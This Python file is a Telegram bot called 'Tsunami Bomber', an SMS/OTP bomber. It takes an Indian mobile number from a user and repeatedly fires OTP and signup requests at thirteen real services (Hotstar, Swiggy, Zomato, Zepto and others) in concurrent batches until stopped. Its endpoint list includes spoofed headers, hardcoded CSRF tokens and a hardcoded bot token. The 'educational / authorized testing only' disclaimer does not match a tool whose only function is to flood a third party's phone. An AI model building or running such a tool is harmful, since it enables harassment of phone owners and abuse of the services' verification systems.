"""
Tsunami Bomber - ULTRA FAST (Button Interface)
⚠️ Educational / authorized testing only.
"""
import os
import sys
import time
import asyncio
import logging
from typing import Optional

import aiohttp
from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters,
)
from starlette.applications import Starlette
from starlette.responses import PlainTextResponse, Response
from starlette.routing import Route
import uvicorn

# ================== CONFIG ==================
BOT_TOKEN       = os.environ.get("BOT_TOKEN", "9160551324:AAGsDDQxM0i-G_c9z5x6Cmt1N3bXbHyUPsw")
WEBHOOK_URL     = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
PORT            = int(os.environ.get("PORT", 8000))

CONCURRENCY     = int(os.environ.get("CONCURRENCY", 15))
DELAY           = float(os.environ.get("DELAY", 0.05))
REQUEST_TIMEOUT = int(os.environ.get("REQUEST_TIMEOUT", 5))
# ============================================

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger("tsunami")

user_sessions: dict = {}
_http_session: Optional[aiohttp.ClientSession] = None
telegram_app: Optional[Application] = None

def is_valid_target(num: str) -> bool:
    return num.isdigit() and len(num) == 10 and num[0] in "6789"

# =========================================================================
#  ENDPOINTS (Purani + Aapki Bheji Hui Nayi 10 APIs)
# =========================================================================
def build_endpoints():
    UA_C2 = ("Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) "
             "AppleWebKit/537.36 (KHTML, like Gecko) "
             "Chrome/85.0.4183.127 Mobile Safari/537.36")
    
    E = []

    # ============== AAPKI NAYI 10 APIS ==============

    # 1. Hotstar
    E.append({"name":"Hotstar","method":"POST",
      "url":"https://www.hotstar.com/api/internal/bff/v2/freshstart/pages/1/spaces/1/widgets/8?action=userRegistration",
      "headers":{"Host":"www.hotstar.com","content-type":"application/json",
        "accept":"*/*","user-agent":UA_C2,
        "origin":"https://www.hotstar.com","referer":"https://www.hotstar.com/"},
      "data":'{"@type":"type.googleapis.com/feature.login.InitiatePhoneLoginRequest","initiate_by":0,"phone_number":"{t}"}'})

    # 2. WorkIndia
    E.append({"name":"WorkIndia","method":"POST",
      "url":"https://api.workindia.in/api/auth/employer/check-user-v2/",
      "headers":{"Host":"api.workindia.in","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://www.workindia.in","referer":"https://www.workindia.in/"},
      "data":'{"mobile":"{t}"}'})

    # 3. JobHai
    E.append({"name":"JobHai","method":"POST",
      "url":"https://api.jobhai.com/auth/jobseeker/v3/send_otp",
      "headers":{"Host":"api.jobhai.com","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://www.jobhai.com","referer":"https://www.jobhai.com/"},
      "data":'{"phone":"{t}"}'})

    # 4. OLX
    E.append({"name":"OLX","method":"POST",
      "url":"https://www.olx.in/api/auth/authenticate?lang=en-IN",
      "headers":{"Host":"www.olx.in","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://www.olx.in","referer":"https://www.olx.in/"},
      "data":'{"phone":"{t}"}'})

    # 5. Blinkit
    E.append({"name":"Blinkit","method":"POST",
      "url":"https://blinkit.com/v2/accounts/",
      "headers":{"Host":"blinkit.com","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://blinkit.com","referer":"https://blinkit.com/"},
      "data":'{"phone":"{t}"}'})

    # 6. Meesho
    E.append({"name":"Meesho","method":"POST",
      "url":"https://www.meesho.com/api/v1/user/login/request-otp",
      "headers":{"Host":"www.meesho.com","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://www.meesho.com","referer":"https://www.meesho.com/"},
      "data":'{"phone":"{t}"}'})

    # 7. JioMart
    E.append({"name":"JioMart","method":"POST",
      "url":"https://www.jiomart.com/api/service/application/user/authentication/v1.0/otp/mobile/send?platform=685945f46c8c7aee3f3af605",
      "headers":{"Host":"www.jiomart.com","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://www.jiomart.com","referer":"https://www.jiomart.com/"},
      "data":'{"mobile":"{t}"}'})

    # 8. Tata Digital
    E.append({"name":"TataDigital","method":"POST",
      "url":"https://api.tatadigital.com/api/v3/sso/check-phone",
      "headers":{"Host":"api.tatadigital.com","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://www.tatadigital.com"},
      "data":'{"phone":"{t}"}'})

    # 9. Zepto
    E.append({"name":"Zepto","method":"POST",
      "url":"https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
      "headers":{"Host":"bff-gateway.zepto.com","content-type":"application/json",
        "accept":"*/*","user-agent":UA_C2,
        "origin":"https://www.zeptonow.com","referer":"https://www.zeptonow.com/"},
      "data":'{"phone":"+91{t}"}'})

    # 10. Goibibo
    E.append({"name":"Goibibo","method":"POST",
      "url":"https://userservice.goibibo.com/ext/web/pwa/send/token/OTP_IS_REG",
      "headers":{"Host":"userservice.goibibo.com","content-type":"application/json",
        "accept":"application/json","user-agent":UA_C2,
        "origin":"https://www.goibibo.com"},
      "data":'{"phone":"{t}"}'})


    # ============== PURANI WORKING APIS ==============
    
    # 11. Ajio OTP
    E.append({"name":"AjioOTP","method":"POST",
      "url":"https://login.web.ajio.com/api/auth/signupSendOTP",
      "headers":{"Host":"login.web.ajio.com","accept":"application/json",
        "Origin":"https://www.ajio.com","User-Agent":UA_C2,
        "content-type":"application/json",
        "Referer":"https://www.ajio.com/signup?referrer=/my-account/"},
      "data":'{"firstName":"Tsunami","login":"t@t.com","password":"kd34646@3131nxnxn","genderType":"","mobileNumber":"{t}","requestType":"SENDOTP"}'})

    # 12. Swiggy
    E.append({"name":"Swiggy","method":"POST",
      "url":"https://www.swiggy.com/mapi/auth/signup",
      "headers":{"Host":"www.swiggy.com","origin":"https://www.swiggy.com",
        "user-agent":UA_C2,"content-type":"application/json","accept":"*/*",
        "referer":"https://www.swiggy.com/auth/register"},
      "data":'{"name":"dbdbdbd","email":"t@t.com","password":"sndndndbdj283jsbsbs","referral_code":"","mobile":"{t}","_csrf":"jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk"}'})

    # 13. Zomato
    E.append({"name":"Zomato","method":"POST",
      "url":"https://www.zomato.com/webroutes/auth/login",
      "headers":{"Host":"www.zomato.com","x-zomato-csrft":"a6b0c09972b2bdd30c9c1b6552caee5d",
        "user-agent":UA_C2,"content-type":"application/json","accept":"*/*",
        "origin":"https://www.zomato.com","referer":"https://www.zomato.com/"},
      "data":'{"country_id":1,"phone":"{t}","verification_type":"sms","method":"phone"}'})

    return E

ENDPOINTS = build_endpoints()

# ================== HTTP SESSION ==================
async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=20, ssl=False)
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        _http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    return _http_session

async def fire_endpoint(ep: dict, target: str) -> bool:
    url = ep["url"].replace("{t}", target)
    headers = {k: v.replace("{t}", target) for k, v in ep["headers"].items()}
    data = ep["data"]
    if isinstance(data, str):
        data = data.replace("{t}", target)
    try:
        session = await get_http_session()
        async with session.request(method=ep["method"], url=url, headers=headers, data=data if data else None, ssl=False) as resp:
            await resp.read()
            return True
    except Exception:
        return False

async def _fire_batch(batch, target):
    tasks = [fire_endpoint(ep, target) for ep in batch]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return sum(1 for r in results if r is True)

# ================== BUTTON HANDLERS ==================
async def start_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("🚀 Start Bombing", callback_data="start_bomb")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    text = (
        "🌊 **TSUNAMI ULTRA FAST** 🌊\n\n"
        "Welcome! Ready to test the APIs?\n"
        "Click the button below to begin."
    )
    if update.message:
        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await update.callback_query.message.edit_text(text, reply_markup=reply_markup, parse_mode="Markdown")

async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    if query.data == "start_bomb":
        user_sessions[uid] = {"state": "awaiting_target", "running": False}
        await query.message.edit_text(
            "📱 **Step 1:** Send target number (10 digits, no +91)\n"
            "🚀 Bombing starts instantly after that.",
            parse_mode="Markdown"
        )
    
    elif query.data == "stop_bomb":
        s = user_sessions.get(uid)
        if s and s.get("running"):
            s["running"] = False
            s["cancelled"] = True
            await query.message.edit_text("🛑 **Stopping...** Please wait for the report.", parse_mode="Markdown")
        else:
            await query.message.edit_text("ℹ️ No active session.")

# ================== TEXT HANDLER ==================
async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text.strip()
    s = user_sessions.get(uid)
    
    if not s or s.get("state") != "awaiting_target":
        return
        
    if not is_valid_target(text):
        await update.message.reply_text("❌ Invalid. 10 digits starting with 6/7/8/9.")
        return

    # Instant start
    s.update(target=text, state="running", running=True, cancelled=False, sent=0, round=0, started_at=time.time())
    
    # Create Stop Button
    keyboard = [[InlineKeyboardButton("🛑 Stop Bombing", callback_data="stop_bomb")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"🔥 **BOMBING STARTED** 🔥\n\n"
        f"🎯 Target: `{text}`\n"
        f"🔌 Endpoints: {len(ENDPOINTS)}\n"
        f"⚡ Status: Running...",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )
    
    asyncio.create_task(run_bombing(uid, s))

# ================== BOMBING LOGIC ==================
async def run_bombing(uid: int, s: dict):
    target = s["target"]
    sent = 0
    start = time.time()
    idx = 0
    
    try:
        while s.get("running"):
            s["round"] += 1
            batch = []
            # Create batches of endpoints
            for _ in range(CONCURRENCY):
                batch.append(ENDPOINTS[idx % len(ENDPOINTS)])
                idx += 1

            ok = await _fire_batch(batch, target)
            sent += ok
            s["sent"] = sent
            
            if DELAY > 0:
                await asyncio.sleep(DELAY)
                
    except Exception as e:
        logger.exception(f"Bombing error: {e}")
    finally:
        s["running"] = False

    # Send Final Report
    try:
        bot = Bot(token=BOT_TOKEN)
        elapsed = int(time.time() - start)
        reason = "🛑 Stopped by you" if s.get("cancelled") else "✅ Done"
        
        await bot.send_message(
            uid,
            f"{reason}!\n\n"
            f"📊 **Report for** `{target}`\n"
            f"📨 Total Sent: *{sent}*\n"
            f"⏱ Duration: {elapsed}s\n"
            f"⚡ Avg Rate: {sent // max(elapsed,1)} req/s",
            parse_mode="Markdown"
        )
    except Exception:
        pass

# ================== WEBHOOK & STARLETTE ==================
async def health(request):
    return PlainTextResponse("OK", status_code=200)

async def root(request):
    return PlainTextResponse("Tsunami Bot is running 🌊")

async def startup():
    global telegram_app
    if not WEBHOOK_URL:
        return

    webhook_path = f"/webhook/{BOT_TOKEN}"
    full_url = f"{WEBHOOK_URL}{webhook_path}"

    telegram_app = Application.builder().token(BOT_TOKEN).updater(None).build()
    
    # Add Handlers
    telegram_app.add_handler(CommandHandler("start", start_cmd))
    telegram_app.add_handler(CallbackQueryHandler(button_handler))
    telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    await telegram_app.initialize()
    await telegram_app.bot.set_webhook(url=full_url, allowed_updates=Update.ALL_TYPES)
    await telegram_app.start()
    logger.info(f"✅ Webhook set to {full_url}")

async def webhook(request):
    if telegram_app is None:
        return Response("not ready", status_code=503)
    try:
        data = await request.json()
        update = Update.de_json(data, telegram_app.bot)
        await telegram_app.process_update(update)
    except Exception as e:
        logger.exception(f"webhook error: {e}")
    return Response("ok")

async def shutdown():
    global _http_session, telegram_app
    if _http_session and not _http_session.closed:
        await _http_session.close()
    if telegram_app:
        await telegram_app.stop()
        await telegram_app.shutdown()

def create_app() -> Starlette:
    routes = [
        Route("/", root),
        Route("/health", health),
        Route(f"/webhook/{BOT_TOKEN}", webhook, methods=["POST"]),
    ]
    return Starlette(routes=routes, on_startup=[startup], on_shutdown=[shutdown])

app = create_app()

if __name__ == "__main__":
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ Set BOT_TOKEN env var")
        sys.exit(1)
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="info")
